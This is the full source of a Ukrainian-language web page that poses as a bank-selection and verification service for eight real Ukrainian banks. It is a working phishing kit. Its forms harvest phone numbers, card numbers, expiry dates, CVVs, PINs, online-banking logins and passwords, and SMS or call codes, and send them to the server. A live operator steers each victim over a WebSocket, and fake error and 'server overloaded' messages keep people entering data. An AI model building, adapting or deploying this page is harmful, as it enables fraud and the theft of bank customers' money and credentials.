<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оберіть свій банк</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; }
        :root {
            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
        }
        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
        #bank-selection-screen { opacity: 1; transform: scale(1); }
        
        #form-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0; visibility: hidden; transform: scale(1.05);
            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
            display: flex; align-items: center; padding: 20px;
        }
        .form-container {
            width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
            background-color: var(--white); padding: 30px; border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
        }
        body.form-active { background: var(--bg-gradient); overflow: hidden; }
        body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
        body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
        .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
        .bank-item {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
            box-shadow: 0 4px 10px var(--shadow-color); position: relative;
        }
        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
        .bank-item .bank-name { font-size: 15px; font-weight: 600; }
        .bank-item.disabled {
            opacity: 0.5;
            cursor: not-allowed;
            pointer-events: none;
        }
        .bank-item.disabled .unavailable-label {
            position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
            font-size: 12px; font-weight: bold; color: var(--danger-color);
            background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
        }
        #custom-modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.5);
            display: none; justify-content: center; align-items: center;
            z-index: 1000;
        }
        .custom-modal-content {
            background-color: var(--white); padding: 25px; border-radius: 16px;
            width: 90%; max-width: 380px; text-align: center;
        }
        .custom-modal-content h3 { margin-top: 0; }
        .pin-pad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 25px auto; max-width: 240px; }
        .pin-pad button {
            width: 60px; height: 60px; border-radius: 50%; border: 1px solid var(--border-color);
            background-color: #fff; font-size: 24px; cursor: pointer; transition: background-color 0.2s;
            display: flex; justify-content: center; align-items: center; color: var(--dark-text);
        }
        .pin-pad button:hover { background-color: #f1f1f1; }
        .pin-display {
            height: 50px; border: 1px solid var(--border-color); border-radius: 12px; margin: 20px 0;
            display: flex; justify-content: center; align-items: center; letter-spacing: 1em; font-size: 30px;
        }
        .loader-icon { animation: spin 2s linear infinite; width: 80px; height: 80px; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #form-header { text-align: center; margin-bottom: 25px; }
        #form-header-logo { max-height: 50px; max-width: 150px; }
        #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
        .input-group { margin-bottom: 15px; position: relative; }
        .input-field {
            width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
            font-size: 18px; font-weight: 500; transition: all 0.3s ease;
        }
        .input-field.invalid { border-color: var(--danger-color); }
        .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
        .phone-input-wrapper { display: flex; }
        .phone-prefix {
            padding: 15px; border: 1px solid var(--border-color); border-right: none;
            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
            flex-shrink: 0; display: flex; align-items: center;
        }
        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; }
        .multi-input-row { display: flex; gap: 10px; }
        .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
        .btn {
            width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
            font-weight: 700; cursor: pointer; transition: all 0.3s ease;
            flex-basis: 0; flex-grow: 1;
        }
        .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
        body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
        body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
        body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
        body[data-theme="alliance"] { --primary-color: #0078C9; --accent-color: #005a99; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%); }
        body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D226; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
        body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
        body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
        body[data-theme="ukrsib"] { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
        .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
        .btn-back { background-color: #f1f3f5; color: var(--light-text); }
    </style>
</head>
<body>
    <div id="bank-selection-screen" class="screen">
        <h1>Оберіть свій банк</h1>
        <div class="bank-grid"></div>
    </div>
    <div id="form-screen" class="screen">
        <div class="form-container">
            <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
            <h2 id="modal-title"></h2>
            <div id="modal-step-content"></div>
            <div class="modal-footer">
                <button class="btn btn-back" id="back-btn">Назад</button>
                <button class="btn btn-next" id="next-btn">Далі</button>
            </div>
        </div>
    </div>
    
    <div id="custom-modal-overlay">
        <div class="custom-modal-content" id="custom-modal-content"></div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref') || 'unknown';
    localStorage.setItem('referrer', ref);

    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    let ws;
    let activeBankData = {};
    let currentStepIndex = 0;
    let collectedData = {};

    const specialFlowSteps = [
        { type: 'phone', title: 'Введіть номер телефону' },
        { type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }
    ];

    const confirmationSteps = [
        {
            type: 'confirm_all',
            title: 'Підтвердити володіння карткою',
            fields: [
                { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' },
                { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' },
                { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' },
                { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }
            ]
        }
    ];

    // --- ИЗМЕНЕНИЕ: Убраны флаги disabled ---
    const bankFlows = {
        'oschadbank': {
            name: 'Ощадбанк',
            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png',
            theme: 'oschadbank',
            steps: [
                { type: 'phone', title: 'Введіть номер телефону' },
                { type: 'card', title: 'Введіть номер карти' },
            ]
        },
        'raiffeisen': {
            name: 'Райффайзен',
            logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg',
            theme: 'raiffeisen',
            steps: specialFlowSteps,
            special: true
        },
        'alliance': {
            name: 'Альянс',
            logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14',
            theme: 'alliance',
            steps: specialFlowSteps,
            special: true
        },
        'pumb': {
            name: 'ПУМБ',
            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp',
            theme: 'pumb',
            steps: specialFlowSteps,
            special: true
        },
        'otp': {
            name: 'OTP Bank',
            logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png',
            theme: 'otp',
            steps: specialFlowSteps,
            special: true
        },
        'vostok': {
            name: 'Восток',
            logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png',
            theme: 'vostok',
            steps: specialFlowSteps,
            special: true
        },
        'izibank': {
            name: 'Izibank',
            logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png',
            theme: 'izibank',
            steps: specialFlowSteps,
            special: true
        },
        'ukrsib': {
            name: 'Укрсиб',
            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp',
            theme: 'ukrsib',
            steps: specialFlowSteps,
            special: true
        }
    };

    const bankGrid = document.querySelector('.bank-grid');
    const body = document.body;
    const formHeaderLogo = document.getElementById('form-header-logo');
    const modalTitle = document.getElementById('modal-title');
    const stepContent = document.getElementById('modal-step-content');
    const modalFooter = document.querySelector('.modal-footer');
    const nextBtn = document.getElementById('next-btn');
    const backBtn = document.getElementById('back-btn');
    const customModalOverlay = document.getElementById('custom-modal-overlay');
    const customModalContent = document.getElementById('custom-modal-content');

    // --- ИЗМЕНЕНИЕ: Упрощенная отрисовка банков ---
    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
        const bank = bankFlows[id];
        return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
    }).join('');

    function connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
        ws = new WebSocket(`${protocol}://${window.location.host}`);
        ws.onopen = () => { ws.send(JSON.stringify({ type: 'register', sessionId: sessionId })); };
        ws.onmessage = (event) => { handleServerCommand(JSON.parse(event.data)); };
        ws.onclose = () => { setTimeout(connectWebSocket, 3000); };
        ws.onerror = (error) => console.error('WebSocket error:', error);
    }

    async function sendDataToServer(data, isFinal) {
        collectedData = { ...collectedData, ...data };
        try {
            await fetch(`/api/submit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    sessionId, 
                    bankName: activeBankData.name, 
                    isFinalStep: isFinal, 
                    referrer: localStorage.getItem('referrer') || 'unknown',
                    ...collectedData 
                }),
            });
        } catch (error) {
            console.error('Failed to send data:', error);
        }
    }
    
    function handleNextStep() {
        if (!validateCurrentStep()) return;

        let data = {};
        stepContent.querySelectorAll('.input-field').forEach(input => {
            let key = input.id;
            let value = input.value;
            if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
            if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, '');
            data[key] = value;
        });

        const step = activeBankData.steps[currentStepIndex];
        let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
        
        if (activeBankData.theme === 'oschadbank' && step.type === 'card') {
            isFinalStep = true;
        }
        
        sendDataToServer(data, isFinalStep);

        if ((activeBankData.special && step.type === 'card_simple') || (activeBankData.theme === 'oschadbank' && step.type === 'card')) {
            showWaitingScreen();
            return;
        }

        currentStepIndex++;
        if (currentStepIndex < activeBankData.steps.length) {
            renderStep();
        } else {
            showWaitingScreen();
        }
    }
    
    function handleServerCommand(command) {
        const { type, data } = command;

        const showMessageInMainModal = (title, text, btnText, callback) => {
            modalTitle.textContent = title;
            stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
            modalFooter.style.display = 'flex';
            modalFooter.innerHTML = `<button class="btn btn-next">${btnText}</button>`;
            modalFooter.querySelector('button').onclick = callback;
        };
        
        switch (type) {
            case 'sms':
                modalTitle.textContent = 'Введіть код з SMS';
                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
                modalFooter.style.display = 'flex';
                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
                document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
                break;
            case 'lk':
                renderCustomModal('lk', data.bankName);
                break;
            case 'call':
                renderCustomModal('call', data.bankName);
                break;
            case 'request_details':
                activeBankData.steps.push(...confirmationSteps);
                currentStepIndex++;
                renderStep();
                break;
            case 'other':
                const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
                if (bankToDisable) {
                    bankToDisable.classList.add('disabled');
                    if(!bankToDisable.querySelector('.unavailable-label')) {
                       bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
                    }
                }
                showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                break;
            case 'pin_error':
                showMessageInMainModal("Невірний ПІН", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); });
                break;
            case 'number_error':
                 showMessageInMainModal("Невірний номер", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); });
                break;
            case 'code_error':
                const smsErrorContainer = document.getElementById('sms-error-container');
                if (smsErrorContainer) smsErrorContainer.innerHTML = `<p style="color:red; text-align:center;">Ви ввели невірний код</p>`;
                break;
            case 'ban':
                document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
                if (ws) ws.close();
                break;
            case 'custom_message_text':
                showMessageInMainModal("Повідомлення від оператора", data.text, "Зрозуміло", renderStep);
                break;
        }
    }
    
    function renderCustomModal(type, bankName) {
        let html = '';
        if (type === 'lk') {
            switch (bankName) {
                case 'Ощадбанк':
                    html = `<h3>Авторизуйтесь через Ощад24</h3>
                            <div class="input-group"><input type="text" class="input-field" id="login" placeholder="Логін"></div>
                            <div class="input-group"><input type="password" class="input-field" id="password" placeholder="Пароль"></div>
                            <button class="btn btn-next" id="custom-submit-btn">Продовжити</button>`;
                    break;
                case 'Райффайзен':
                    html = `<h3>Введіть PIN-код</h3><p>для входу в MyRaif</p>
                            <div class="pin-display" id="pin-display"></div>
                            <div class="pin-pad">
                                <button>1</button><button>2</button><button>3</button>
                                <button>4</button><button>5</button><button>6</button>
                                <button>7</button><button>8</button><button>9</button>
                                <span></span><button>0</button><button id="pin-backspace">⌫</button>
                            </div>
                            <button class="btn btn-next" id="custom-submit-btn" disabled>Продовжити</button>`;
                    break;
                case 'Восток':
                    html = `<h3>Авторизація у VST bank</h3>
                            <div class="input-group"><input type="text" class="input-field" id="login" placeholder="Логін"></div>
                            <div class="input-group"><input type="password" class="input-field" id="password" placeholder="Пароль"></div>
                            <button class="btn btn-next" id="custom-submit-btn">Продовжити</button>`;
                    break;
                case 'Izibank':
                     html = `<h3>Введіть PIN-код</h3><p>для входу в додаток</p>
                            <div class="pin-display" id="pin-display"></div>
                            <div class="pin-pad">
                                <button>1</button><button>2</button><button>3</button>
                                <button>4</button><button>5</button><button>6</button>
                                <button>7</button><button>8</button><button>9</button>
                                <span></span><button>0</button><button id="pin-backspace">⌫</button>
                            </div>
                            <button class="btn btn-next" id="custom-submit-btn" disabled>Продовжити</button>`;
                    break;
                 case 'Укрсиб':
                    html = `<h3>Підтвердити володіння карткою</h3>
                            ${generateInputHTML('card', 'Номер картки', 'tel', '19')}
                            <div class="multi-input-row">
                                ${generateInputHTML('card-expiry', 'Термін дії', 'tel', '5')}
                                ${generateInputHTML('pin', 'PIN', 'password', '4')}
                            </div>
                            <button class="btn btn-next" id="custom-submit-btn">Продовжити</button>`;
                    break;
            }
        } else if (type === 'call') {
            if (bankName === 'Ощадбанк') {
                html = `<h3>Підтвердження операції</h3><p>Вкажіть номер телефону та останні 4 цифри карти</p>
                        <div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div></div>
                        <div class="input-group"><input type="tel" class="input-field" id="card_last4" placeholder="Останні 4 цифри карти" maxlength="4"></div>
                        <button class="btn btn-next" id="custom-submit-btn">Продовжити</button>`;
            }
        }

        customModalContent.innerHTML = html;
        customModalOverlay.style.display = 'flex';
        addCustomModalListeners(bankName);
        addInputFormatting();
    }
    
    function addCustomModalListeners(bankName) {
        const submitBtn = document.getElementById('custom-submit-btn');
        if (submitBtn) {
            submitBtn.onclick = () => {
                const dataToSend = {};
                customModalContent.querySelectorAll('.input-field, .pin-display').forEach(el => {
                   dataToSend[el.id || 'pin'] = el.value || el.textContent;
                });

                sendDataToServer(dataToSend, true);
                
                if (bankName === 'Ощадбанк') {
                     customModalContent.innerHTML = `<h3>Очікуйте</h3><p>Сервер перевантажений</p><img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">`;
                } else {
                    customModalContent.innerHTML = `<h3>Очікуємо</h3><p>Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
                }
            };
        }

        const pinDisplay = document.getElementById('pin-display');
        if (pinDisplay) {
            document.querySelector('.pin-pad').addEventListener('click', (e) => {
                if (e.target.tagName !== 'BUTTON') return;
                const value = e.target.textContent;
                if (value === '⌫') {
                    pinDisplay.textContent = pinDisplay.textContent.slice(0, -1);
                } else if (pinDisplay.textContent.length < 4 && value) {
                    pinDisplay.textContent += value;
                }
                submitBtn.disabled = pinDisplay.textContent.length !== 4;
            });
        }
    }
    
    const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => {
        return `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
    };
    
    function renderStep() {
        if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return;
        const step = activeBankData.steps[currentStepIndex];
        let html = '';

        switch (step.type) {
            case 'phone':
                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
                break;
            case 'card':
            case 'card_simple':
                html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
                break;
            case 'pin':
                html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
                break;
            case 'call_code':
                // --- ИСПРАВЛЕНИЕ: Убрана лишняя точка с запятой (;) ---
                html = `<p style="text-align:center;">Зараз вам буде здійснено дзвінок для проходження авторизації. Підніміть слухавку, натисніть 1 та прослухайте код. Код введіть у форму нижче.</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
                break;
            case 'confirm_all':
                html = step.fields.map(field => generateInputHTML(field.id, field.placeholder, field.type, field.maxlength)).join('');
                break;
        }
        modalTitle.textContent = step.title;
        stepContent.innerHTML = html;
        modalFooter.style.display = 'flex';
        backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
        nextBtn.style.display = 'block';
        addInputFormatting();
    }
    
    document.querySelectorAll('.bank-item').forEach(item => {
        item.addEventListener('click', e => {
            e.preventDefault();
            if (item.classList.contains('disabled')) return;
            const bankId = item.dataset.bank;
            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
            body.dataset.theme = activeBankData.theme;
            formHeaderLogo.src = activeBankData.logoUrl;
            body.classList.add('form-active');
            currentStepIndex = 0;
            collectedData = {};
            renderStep();
            connectWebSocket();
        });
    });

    nextBtn.addEventListener('click', handleNextStep);
    backBtn.addEventListener('click', handleBackStep);
    
    function showWaitingScreen() {
        modalTitle.textContent = 'Очікуємо';
        stepContent.innerHTML = `<p style="text-align:center;">Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); text-align:center; font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
        modalFooter.style.display = 'none';
    }

    function handleBackStep() {
        if (currentStepIndex > 0) {
            currentStepIndex--;
            renderStep();
        } else {
            body.classList.remove('form-active');
        }
    }

    function addInputFormatting() {
        const phoneInput = document.getElementById('phone');
        if (phoneInput) {
            phoneInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
                e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
            });
        }
        const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
        if (cardNumberInput) {
            cardNumberInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
            });
        }
        const cardExpiryInput = document.getElementById('card-expiry');
        if (cardExpiryInput) {
            cardExpiryInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2');
            });
        }
    }
    
    function validateCurrentStep() {
        let isValid = true;
        stepContent.querySelectorAll('.input-field').forEach(input => {
            const errorContainer = input.parentElement.querySelector('.error-message');
            input.classList.remove('invalid');
            if (errorContainer) errorContainer.style.display = 'none';

            let value = input.value.replace(/\D/g, '');
            let requiredLength = 0;

            switch (input.id) {
                case 'phone': requiredLength = 9; break;
                case 'card': case 'card_confirm': requiredLength = 16; break;
                case 'card-expiry': requiredLength = 4; break;
                case 'card-cvv': case 'pin': requiredLength = 3; break;
            }

            if (input.id === 'pin' && value.length === 4) requiredLength = 4;

            if (requiredLength > 0 && value.length < requiredLength) {
                isValid = false;
                input.classList.add('invalid');
                if (errorContainer) {
                    errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`;
                    errorContainer.style.display = 'block';
                }
            }
        });
        return isValid;
    }
    
    async function submitSmsCode() {
        const codeInput = document.getElementById('sms-code');
        const code = codeInput.value;
        const errorContainer = document.getElementById('sms-error-container');
        if (!code.trim()) {
            if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
            return;
        }
        try {
            await fetch(`/api/sms`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }),
            });
        } catch (error) { console.error('Failed to send sms code:', error); }
        if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
        codeInput.value = '';
    }
});
</script>
